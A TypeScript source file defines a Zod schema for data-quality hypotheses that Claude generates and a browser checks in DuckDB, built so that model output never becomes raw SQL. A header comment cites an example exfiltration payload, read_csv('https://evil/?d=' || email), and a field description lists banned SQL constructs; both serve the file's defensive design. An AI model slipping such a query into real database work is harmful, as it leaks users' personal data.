import { z } from "zod";

/**
 * The hypothesis contract, shared by the Worker (which asks Claude for these)
 * and the browser (which evaluates them).
 *
 * Claude never emits raw SQL. It emits a structured *check*, so the FROM clause
 * is always ours and the result shape is always a violation count. That closes
 * the obvious exfiltration hole, where a generated query could smuggle data out
 * via something like read_csv('https://evil/?d=' || email).
 *
 * WIRE FORMAT NOTE: the wire schema is flat (every field required, unused ones
 * empty) rather than a discriminated union, because strict structured-output
 * JSON Schema wants all properties present and required. We normalise it into a
 * proper discriminated union the moment it arrives.
 */

export const SEVERITIES = ["high", "medium", "low"] as const;
export const SeveritySchema = z.enum(SEVERITIES);
export type Severity = z.infer<typeof SeveritySchema>;

export const CHECK_KINDS = ["row_predicate", "unique"] as const;

export const WireHypothesisSchema = z.object({
  title: z
    .string()
    .describe(
      "A short, falsifiable claim stated as fact, e.g. 'discount is between 0 and 1'.",
    ),
  rationale: z
    .string()
    .describe(
      "One or two sentences citing the specific profile statistics that motivated this hypothesis.",
    ),
  columns: z.array(z.string()).describe("Column names this hypothesis concerns."),
  severity: SeveritySchema.describe(
    "How damaging it would be if this turned out to be false.",
  ),
  kind: z
    .enum(CHECK_KINDS)
    .describe(
      "'row_predicate' for a boolean expression that must hold on every row; 'unique' to assert a column set has no duplicates.",
    ),
  expression: z
    .string()
    .describe(
      "For kind='row_predicate': a DuckDB boolean expression over this table's columns that must be TRUE for every row, e.g. \"discount >= 0 AND discount <= 1\". Must not contain SELECT, subqueries, semicolons, comments, or any function that reads a file or URL. Empty string when kind='unique'.",
    ),
  unique_columns: z
    .array(z.string())
    .describe(
      "For kind='unique': the columns that together should be unique. Empty array when kind='row_predicate'.",
    ),
});

export const WireHypothesesSchema = z.object({
  hypotheses: z.array(WireHypothesisSchema),
});

export type WireHypothesis = z.infer<typeof WireHypothesisSchema>;
export type WireHypotheses = z.infer<typeof WireHypothesesSchema>;

/* ---------------------------------------------------------------- app types */

export type Check =
  | { kind: "row_predicate"; expression: string }
  | { kind: "unique"; columns: string[] };

export interface Hypothesis {
  id: string;
  title: string;
  rationale: string;
  columns: string[];
  severity: Severity;
  check: Check;
}

/** Outcome of evaluating one hypothesis locally against DuckDB. */
export type HypothesisResult =
  | { status: "holds"; violations: 0; rowCount: number; ms: number }
  | { status: "falsified"; violations: number; rowCount: number; pct: number; ms: number }
  | { status: "skipped"; reason: string };

/**
 * Turn the flat wire form into the discriminated union, dropping anything
 * malformed. Ids are assigned here so they are stable for React keys and are
 * never model-controlled.
 */
export function normalizeHypotheses(wire: WireHypotheses): Hypothesis[] {
  const out: Hypothesis[] = [];
  wire.hypotheses.forEach((h, i) => {
    const base = {
      id: `h${i + 1}`,
      title: h.title.trim(),
      rationale: h.rationale.trim(),
      columns: h.columns,
      severity: h.severity,
    };
    if (h.kind === "unique") {
      if (h.unique_columns.length === 0) return;
      out.push({ ...base, check: { kind: "unique", columns: h.unique_columns } });
    } else {
      if (h.expression.trim() === "") return;
      out.push({
        ...base,
        check: { kind: "row_predicate", expression: h.expression.trim() },
      });
    }
  });
  return out;
}
